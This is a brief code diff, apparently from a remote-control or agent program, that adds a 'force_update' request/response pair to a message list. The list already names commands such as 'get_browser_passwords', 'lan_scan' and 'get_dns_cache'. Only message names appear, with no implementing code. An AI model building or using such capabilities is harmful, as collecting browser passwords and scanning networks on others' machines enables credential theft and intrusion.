@@ -693,6 +693,7 @@ for _rr in [
     ("lan_scan",               "lan_scan_result"),
     ("get_dns_cache",          "dns_cache_result"),
     ("get_browser_passwords",  "browser_passwords_result"),
+    ("force_update",           "force_update_result"),
 ]:
     _make_req_resp(*_rr)
 
